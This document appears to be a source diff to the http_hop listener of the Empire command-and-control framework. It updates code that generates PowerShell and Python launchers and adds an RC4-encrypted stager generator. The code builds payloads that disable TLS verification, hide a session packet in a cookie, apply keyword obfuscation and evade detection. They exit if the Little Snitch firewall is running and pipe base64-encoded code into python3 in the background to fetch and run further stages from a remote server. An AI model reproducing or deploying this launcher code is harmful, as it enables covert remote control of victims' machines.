@@ -4,10 +4,12 @@ import logging
 import os
 import random
 from builtins import object, str
+from textwrap import dedent
 from typing import List, Optional, Tuple
 
-from empire.server.common import helpers, packets, templating
+from empire.server.common import encryption, helpers, packets, templating
 from empire.server.common.empire import MainMenu
+from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util, listener_util
 
 LOG_NAME_PREFIX = __name__
@@ -141,12 +143,12 @@ class Listener(object):
 
             host = listenerOptions["Host"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
-            stagingKey = listenerOptions["RedirectStagingKey"]["Value"]
+            staging_key = listenerOptions["RedirectStagingKey"]["Value"]
             profile = listenerOptions["DefaultProfile"]["Value"]
             uris = [a for a in profile.split("|")[0].split(",")]
             stage0 = random.choice(uris)
 
-            if language.startswith("po"):
+            if language == "powershell":
                 # PowerShell
 
                 stager = '$ErrorActionPreference = "SilentlyContinue";'
@@ -199,7 +201,7 @@ class Listener(object):
 
                 # code to turn the key string into a byte array
                 stager += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
+                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
                 )
 
                 # this is the minimized RC4 stager code from rc4.ps1
@@ -207,7 +209,7 @@ class Listener(object):
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
-                    stagingKey,
+                    staging_key,
                     sessionID="00000000",
                     language="POWERSHELL",
                     meta="STAGE0",
@@ -234,6 +236,8 @@ class Listener(object):
                         stager,
                         obfuscation_command=obfuscation_command,
                     )
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
                 # base64 encode the stager and return it
                 if encode and (
                     (not obfuscate) or ("launcher" not in obfuscation_command.lower())
@@ -243,38 +247,39 @@ class Listener(object):
                     # otherwise return the case-randomized stager
                     return stager
 
-            if language.startswith("py"):
+            if language in ["python", "ironpython"]:
                 # Python
 
                 launcherBase = "import sys;"
                 if "https" in host:
                     # monkey patch ssl woohooo
-                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
-
+                    launcherBase += dedent(
+                        """
+                        import ssl;
+                        if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
+                        """
+                    )
                 try:
                     if safeChecks.lower() == "true":
-                        launcherBase += "import re, subprocess;"
-                        launcherBase += (
-                            'cmd = "ps -ef | grep Little\ Snitch | grep -v grep"\n'
-                        )
-                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
-                        launcherBase += "out, err = ps.communicate()\n"
-                        launcherBase += 'if re.search("Little Snitch", out):\n'
-                        launcherBase += "   sys.exit()\n"
+                        launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
                     p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
-                    log.error(p, exc_info=True)
+                    log.error(p)
 
                 if userAgent.lower() == "default":
                     userAgent = profile.split("|")[1]
 
-                launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
-                launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "server='%s';t='%s';" % (host, stage0)
+                launcherBase += dedent(
+                    f"""
+                    import urllib.request;
+                    UA='{ userAgent }';server='{ host }';t='{ stage0 }';hop='{ listenerName }';
+                    req=urllib.request.Request(server+t);
+                    """
+                )
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
-                    stagingKey,
+                    staging_key,
                     sessionID="00000000",
                     language="PYTHON",
                     meta="STAGE0",
@@ -283,64 +288,56 @@ class Listener(object):
                 )
                 b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")
 
-                launcherBase += "import urllib2\n"
-
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
-                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                     else:
-                        proto = proxy.Split(":")[0]
-                        launcherBase += (
-                            "proxy = urllib2.ProxyHandler({'"
-                            + proto
-                            + "':'"
-                            + proxy
-                            + "'});\n"
-                        )
+                        proto = proxy.split(":")[0]
+                        launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
 
                     if proxyCreds != "none":
                         if proxyCreds == "default":
-                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
+
+                            # add the RC4 packet to a cookie
+                            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
                         else:
-                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                             username = proxyCreds.split(":")[0]
                             password = proxyCreds.split(":")[1]
-                            launcherBase += (
-                                "proxy_auth_handler.add_password(None,'"
-                                + proxy
-                                + "','"
-                                + username
-                                + "','"
-                                + password
-                                + "');\n"
-                            )
-                            launcherBase += (
-                                "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                            launcherBase += dedent(
+                                f"""
+                                proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
+                                proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
+                                o = urllib.request.build_opener(proxy, proxy_auth_handler);
+                                o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
+                                """
                             )
                     else:
-                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                 else:
-                    launcherBase += "o = urllib2.build_opener();\n"
-
-                # add the RC4 packet to a cookie
-                launcherBase += (
-                    'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session=%s")];\n'
-                    % (b64RoutingPacket)
-                )
+                    launcherBase += "o = urllib.request.build_opener();\n"
 
                 # install proxy and creds globally, so they can be used with urlopen.
-                launcherBase += "urllib2.install_opener(o);\n"
-                launcherBase += "a=o.open(server+t).read();\n"
+                launcherBase += "urllib.request.install_opener(o);\n"
+                launcherBase += "a=urllib.request.urlopen(req).read();\n"
 
                 # download the stager and extract the IV
-                launcherBase += listener_util.python_extract_stager(stagingKey)
+                launcherBase += listener_util.python_extract_stager(staging_key)
+
+                if obfuscate:
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(
+                        launcherBase,
+                        obfuscation_command=obfuscation_command,
+                    )
+                    launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                        launcherBase
+                    )
 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase).decode("UTF-8")
-                    launcher = (
-                        "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &"
-                        % (launchEncoded)
-                    )
+                    launchEncoded = base64.b64encode(
+                        launcherBase.encode("UTF-8")
+                    ).decode("UTF-8")
+                    launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
                     return launcher
                 else:
                     return launcherBase
@@ -363,8 +360,140 @@ class Listener(object):
         If you want to support staging for the listener module, generate_stager must be
         implemented to return the stage1 key-negotiation stager code.
         """
-        log.error("generate_stager() not implemented for listeners/http_hop")
-        return ""
+        if not language:
+            log.error("listeners/http generate_stager(): no language specified!")
+            return None
+
+        with SessionLocal.begin() as db:
+            listener = self.mainMenu.listenersv2.get_by_name(
+                db, listenerOptions["RedirectListener"]["Value"]
+            )
+
+            profile = listener.options["DefaultProfile"]["Value"]
+            uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
+            staging_key = listener.options["StagingKey"]["Value"]
+            workingHours = listener.options["WorkingHours"]["Value"]
+            killDate = listener.options["KillDate"]["Value"]
+            host = listenerOptions["Host"]["Value"]
+            customHeaders = profile.split("|")[2:]
+            session_cookie = ""
+
+        # select some random URIs for staging from the main profile
+        stage1 = random.choice(uris)
+        stage2 = random.choice(uris)
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.ps1")
+
+            template_options = {
+                "working_hours": workingHours,
+                "kill_date": killDate,
+                "staging_key": staging_key,
+                "profile": profile,
+                "session_cookie": session_cookie,
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            # make sure the server ends with "/"
+            if not host.endswith("/"):
+                host += "/"
+
+            # Patch in custom Headers
+            remove = []
+            if customHeaders != []:
+                for key in customHeaders:
+                    value = key.split(":")
+                    if "cookie" in value[0].lower() and value[1]:
+                        continue
+                    remove += value
+                headers = ",".join(remove)
+                stager = stager.replace(
+                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
+                )
+
+            staging_key = staging_key.encode("UTF-8")
+            unobfuscated_stager = listener_util.remove_lines_comments(stager)
+
+            if obfuscate:
+                obfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
+                    unobfuscated_stager, obfuscation_command=obfuscation_command
+                )
+                obfuscated_stager = self.mainMenu.obfuscationv2.obfuscate_keywords(
+                    obfuscated_stager
+                )
+
+            # base64 encode the stager and return it
+            # There doesn't seem to be any conditions in which the encrypt flag isn't set so the other
+            # if/else statements are irrelevant
+            if encode:
+                return helpers.enc_powershell(obfuscated_stager)
+            elif encrypt:
+                RC4IV = os.urandom(4)
+                return RC4IV + encryption.rc4(
+                    RC4IV + staging_key, obfuscated_stager.encode("UTF-8")
+                )
+            else:
+                return obfuscated_stager
+
+        if language in ["python", "ironpython"]:
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/http.py")
+
+            template_options = {
+                "working_hours": workingHours,
+                "kill_date": killDate,
+                "staging_key": staging_key,
+                "profile": profile,
+                "session_cookie": session_cookie,
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
+
+            # base64 encode the stager and return it
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager,
+                    obfuscation_command=obfuscation_command,
+                )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
+            if encode:
+                return base64.b64encode(stager)
+            if encrypt:
+                # return an encrypted version of the stager ("normal" staging)
+                RC4IV = os.urandom(4)
+
+                return RC4IV + encryption.rc4(
+                    RC4IV + staging_key.encode("UTF-8"), stager.encode("UTF-8")
+                )
+            else:
+                # otherwise return the standard stager
+                return stager
+
+        else:
+            log.error(
+                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+            )
 
     def generate_agent(
         self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
